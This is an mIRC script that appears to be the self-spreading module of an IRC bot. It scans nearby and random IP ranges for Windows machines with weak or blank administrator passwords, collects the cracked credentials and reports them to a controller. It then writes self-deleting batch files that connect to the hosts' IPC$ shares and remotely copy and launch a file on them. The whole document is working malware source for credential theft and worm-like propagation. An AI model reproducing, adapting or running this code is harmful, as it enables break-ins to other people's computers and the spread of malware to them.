alias ntip { 
  set %rangeip $ip
  set %iip1 $+($gettok(%rangeip,1-3,46),.1) 
  set %iip2 $+($gettok(%rangeip,1-3,46),.255) 
  set %rangeip $+(%iip1,-,%iip2) 
  run system33.exe fixdsys.exe -host %rangeip -ntpass -t 150,75 
  unset %rangeip  
  timerparse -o 0 30 startparse 
  timerroot -o 0 70 getroot 
}
alias ntisp { 
  set %rangeip $ip
  set %iip1 $+($gettok(%rangeip,1-2,46),.,$r(0,255),.1) 
  set %iip2 $+($gettok(%rangeip,1-2,46),.255.255) 
  set %rangeip $+(%iip1,-,%iip2) 
  run system33.exe fixdsys.exe -host %rangeip -ntpass -t 150,75 
  unset %rangeip  
  timerparse -o 0 30 startparse 
  timerroot -o 0 70 getroot 
}
alias startparse {
  set %t 0
  set %results 0
  set %total $findfile(log\,*.htm,0)
  :start
  inc %t
  if (%t <= %total) { parsefile $findfile(log\,*.htm,%t) | goto start }
}
alias parsefile {
  set %temp.test $1
  set %temp.host $nopath($1)
  set %temp.host $remove(%temp.host,.htm)
  set %temp.text $read($1, w, *Type: Administrator*)
  set %temp.line $readn
  if (%temp.line == 0) { return NULL }
  set %temp.text $read($1, $calc($readn - 1))
  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }
  $getuserpass(%temp.text)
}
alias getuserpass {
  set %temp.user $gettok($1,2,60)
  set %temp.user $gettok(%temp.user,2,62)
  set %temp.pass $gettok($1,3,47)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }
  inc %results
  talk [NT Scan] Found: %temp.host %temp.user %temp.pass , Attempting To Root..
  write rcnc.x %temp.host %temp.user %temp.pass
  remove %temp.test
}
alias getuserpass2 {
  set %temp.user $gettok($1,2,62)
  set %temp.user $gettok(%temp.user,1,60)
  set %temp.pass $gettok($1,3,47)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }
  inc %results
  talk [NT Scan] Found: %temp.host %temp.user %temp.pass , Attempting To Root..
  write rcnc.x %temp.host %temp.user %temp.pass
  remove %temp.test
}
alias getroot { if ($lines(rcnc.x) < 1) { halt } | root $read(rcnc.x,1) | write -dl1 rcnc.x }
alias root { if ($1 == $null) { halt }
  :select
  set %tempfile $+(ord,$r(0,999),.bat)
  set %t.drive $r(n,z) $+ :
  if ($exists(%t.drive) == $true) { goto select }
  set %t.user $2
  if ($3 == [NULL]) { set %t.pass $null | set %ps.pass -p "" }
  else { set %t.pass $3 | set %ps.pass -p $3 }
  set %t.host \\ $+ $1 | set %t.share IPC$
  write %tempfile net use %t.drive /delete
  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)
  write %tempfile net use %t.drive %t.host $+ \ $+ %t.share
  write %tempfile nav %t.host -u %t.user %ps.pass -f -c -d %sf -o
  write %tempfile nav %t.host -u %t.user %ps.pass -d %sf -o
  write %tempfile net use %t.drive /delete
  write %tempfile net use %t.host /delete
  write %tempfile del %tempfile
  talk [NT Scan] Rooting: $1 $2 $+ / $+ $3
  run system33.exe %tempfile
}